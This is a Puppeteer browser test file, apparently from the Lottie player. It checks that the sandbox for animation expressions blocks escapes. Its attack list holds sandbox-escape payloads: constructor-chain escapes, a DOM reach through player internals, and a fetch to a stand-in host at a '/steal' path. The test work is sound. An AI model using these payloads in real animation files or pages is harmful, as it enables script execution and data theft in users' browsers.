/**
 * Loads the built player in Chromium and checks the isolated realm used to
 * compile expressions: expressions still run, the function constructors are
 * neutered inside the realm, host APIs and player internals stay unreachable
 * and nothing leaks into the page.
 *
 * Requires npm run build. Run with: npm run test:sandbox-browser
 */

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');

const playerPath = path.join(__dirname, '../build/player/lottie.min.js');
const animationPath = path.join(__dirname, 'animations/ripple.json');

function animationWith(expression) {
  const data = JSON.parse(fs.readFileSync(animationPath, 'utf8'));
  data.layers[0].ks.o = { a: 0, k: 100, x: expression };
  return data;
}

const probes = [
  ['expression runs', 'var $bm_rt;\n$bm_rt = 42;', 42],
  ['expression runs in a separate realm', "var $bm_rt;\n$bm_rt = [] instanceof Array ? 'page realm' : 'separate realm';", 'separate realm'],
  ['globals are shadowed', 'var $bm_rt;\n$bm_rt = [typeof window, typeof document, typeof fetch, typeof XMLHttpRequest, typeof setTimeout, typeof globalThis].join();', 'undefined,undefined,undefined,undefined,undefined,undefined'],
  ['this is undefined', 'var $bm_rt;\nfunction getGlobal() { return this; }\n$bm_rt = typeof getGlobal();', 'undefined'],
  ['computed constructor access throws', 'var $bm_rt;\nvar a = [];\ntry { a["constructor"]; } catch (e) { $bm_rt = "blocked"; }', 'blocked'],
  ['animation api still reachable', 'var $bm_rt;\n$bm_rt = typeof thisComp.layer("bar");', 'object'],
  ['intrinsics still usable', 'var $bm_rt;\n$bm_rt = Math.floor(Math.PI) + new Array(1).length;', 4],
];

const attacks = [
  ['constructor escape', "var $bm_rt;\n[].constructor.constructor('window.__leak_a = 1')();\n$bm_rt = 7;"],
  ['constructor escape by key', "var $bm_rt;\nvar k = 'constr' + 'uctor';\n[][k][k]('window.__leak_b = 1')();\n$bm_rt = 7;"],
  ['window write', 'var $bm_rt;\nwindow.__leak_c = 1;\n$bm_rt = 7;'],
  ['dom through the player', 'var $bm_rt;\nthisLayer._elem.globalData.defs.ownerDocument.defaultView.__leak_d = 1;\n$bm_rt = 7;'],
  ['network', "var $bm_rt;\nfetch('https://sandbox-escape.example.com/steal');\n$bm_rt = 7;"],
  ['timer', 'var $bm_rt;\nsetTimeout(function () { window.__leak_e = 1; }, 0);\n$bm_rt = 7;'],
  ['intrinsic mutation', 'var $bm_rt;\nArray.isArray = function () { return true; };\nMath.floor = function () { return 0; };\n$bm_rt = 7;'],
];

(async () => {
  const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] });
  const page = await browser.newPage();
  const escapedRequests = [];
  page.on('request', (request) => {
    if (request.url().indexOf('sandbox-escape.example.com') !== -1) {
      escapedRequests.push(request.url());
    }
  });
  await page.setContent('<html><body></body></html>');
  await page.addScriptTag({ content: fs.readFileSync(playerPath, 'utf8') });

  let failures = 0;
  const check = (description, assertion) => {
    try {
      assertion();
      console.log('ok    ' + description); // eslint-disable-line no-console
    } catch (error) {
      failures += 1;
      console.log('FAIL  ' + description + ' -> ' + error.message); // eslint-disable-line no-console
    }
  };

  const render = (expression) => page.evaluate((animationData) => {
    const container = document.createElement('div');
    container.style.width = '200px';
    container.style.height = '200px';
    document.body.appendChild(container);
    let captured = null;
    let error = null;
    let svgChildren = 0;
    try {
      const animation = window.lottie.loadAnimation({
        container: container,
        renderer: 'svg',
        loop: false,
        autoplay: false,
        animationData: animationData,
      });
      const property = animation.renderer.elements[0].finalTransform.mProp.o;
      const original = property.setVValue.bind(property);
      property.setVValue = function (value) {
        captured = value;
        return original(value);
      };
      animation.goToAndStop(20, true);
      const svg = container.querySelector('svg');
      svgChildren = svg ? svg.childNodes.length : 0;
      animation.destroy();
    } catch (e) {
      error = e.message;
    }
    container.parentNode.removeChild(container);
    return { captured: captured, error: error, svgChildren: svgChildren };
  }, animationWith(expression));

  for (const [description, expression, expected] of probes) {
    const result = await render(expression);
    check(description, () => {
      assert.strictEqual(result.error, null);
      assert.strictEqual(String(result.captured), String(expected));
    });
  }

  for (const [description, expression] of attacks) {
    const result = await render(expression);
    check('blocks ' + description, () => {
      assert.notStrictEqual(result.captured, 7, 'expression ran to completion');
      assert.ok(result.svgChildren > 0, 'animation stopped rendering: ' + JSON.stringify(result));
    });
  }

  const leaks = await page.evaluate(() => ({
    globals: Object.keys(window).filter((key) => key.indexOf('__leak') === 0),
    isArray: Array.isArray([]),
    floor: Math.floor(1.7),
  }));

  check('no globals created by expressions', () => assert.deepStrictEqual(leaks.globals, []));
  check('host intrinsics untouched', () => {
    assert.strictEqual(leaks.isArray, true);
    assert.strictEqual(leaks.floor, 1);
  });
  check('no network requests from expressions', () => assert.deepStrictEqual(escapedRequests, []));

  await browser.close();

  if (failures) {
    console.log(failures + ' failed'); // eslint-disable-line no-console
    process.exit(1);
  }
  console.log('expression sandbox (browser): all checks passed'); // eslint-disable-line no-console
})();
